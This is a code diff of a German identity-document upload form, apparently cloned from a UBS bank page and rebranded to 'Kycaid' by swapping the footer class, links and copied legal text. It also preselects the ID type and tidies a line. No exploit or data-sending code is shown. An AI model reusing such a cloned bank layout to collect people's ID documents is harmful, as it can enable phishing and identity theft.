@@ -93,7 +93,7 @@
       color: var(--gold);
     }
 
-    .ubs-footer {
+    .Kycaid-footer {
       background-color: #f7f6f2;
       padding: 30px 20px;
       font-size: 14px;
@@ -224,7 +224,7 @@
         <label for="ausweisart">Art des Ausweisdokuments</label>
         <select id="ausweisart" name="Ausweisart">
           <option value="">Bitte auswählen</option>
-          <option value="Personalausweis">Personalausweis</option>
+          <option value="Personalausweis" selected>Personalausweis</option>
           <option value="Reisepass">Reisepass</option>
         </select>
 
@@ -248,9 +248,9 @@
     </form>
   </div>
 
-  <footer class="ubs-footer">
+  <footer class="Kycaid-footer">
     <div class="footer-links">
-      <a href="#">Information on UBS</a>
+      <a href="#">Information on Kycaid</a>
       <span>|</span>
       <a href="#">Terms of use</a>
       <span>|</span>
@@ -262,7 +262,7 @@
     </div>
     <div class="footer-text">
       <p>The products, services, information and/or materials contained within these web pages may not be available for residents of certain jurisdictions. Please consult the sales restrictions relating to the products or services in question for further information.</p>
-      <p>Copying, editing, modifying, distributing, sharing, linking or any other use (whether for commercial purposes or otherwise) of this material, other than personal viewing, without UBS's prior written permission is strictly prohibited.</p>
+      <p>Copying, editing, modifying, distributing, sharing, linking or any other use (whether for commercial purposes or otherwise) of this material, other than personal viewing, without Kycaid's prior written permission is strictly prohibited.</p>
       <p>© Kycaid 2025. All rights reserved.</p>
     </div>
   </footer>
@@ -286,8 +286,7 @@
 
         // Show/hide Rückseite on step 2 based on Ausweisart
         if(step === 1) {
-          if(ausweisartSelect.value ===
-'Reisepass') {
+          if(ausweisartSelect.value === 'Reisepass') {
             rueckseiteContainer.style.display = 'none';
           } else {
             rueckseiteContainer.style.display = 'block';
